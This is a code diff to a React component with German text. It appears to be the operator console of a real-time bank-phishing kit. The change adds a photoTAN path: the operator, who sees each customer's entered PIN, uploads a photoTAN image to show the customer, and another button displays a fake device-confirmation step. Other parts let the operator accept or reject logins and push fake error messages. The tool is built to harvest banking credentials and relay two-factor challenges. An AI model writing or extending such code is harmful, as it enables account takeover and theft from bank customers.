@@ -76,7 +76,7 @@ const AuthLiveCard = () => {
     last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
   });
   const acceptLogin = (r: AuthRow) =>
-    setPhase(r, "confirm", { last_error: null });
+    setPhase(r, r.tan_method === "photo" ? "phototan" : "confirm", { last_error: null });
   const acceptBerater = (r: AuthRow) => setPhase(r, "login", { last_error: null });
   const rejectBerater = (r: AuthRow) => setPhase(r, "berater", {
     last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
@@ -170,11 +170,23 @@ const AuthLiveCard = () => {
                         <Button size="sm" variant="destructive" onClick={() => rejectLogin(r)} disabled={!meta?.pin}>
                           <XCircle className="h-4 w-4 mr-1" />Login ablehnen
                         </Button>
-                        <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
-                        <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
-                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
-                        </Button>
+                        {r.tan_method !== "photo" && (
+                          <>
+                            <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
+                            <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
+                              <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
+                            </Button>
+                          </>
+                        )}
                       </div>
+                      {r.tan_method === "photo" && (
+                        <>
+                          <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
+                          <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin || !r.photo_tan_image}>
+                            <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
+                          </Button>
+                        </>
+                      )}
                       {phase === "login" && !meta?.pin && (
                         <p className="text-xs text-muted-foreground">Wartet auf Login-Eingabe des Kunden.</p>
                       )}
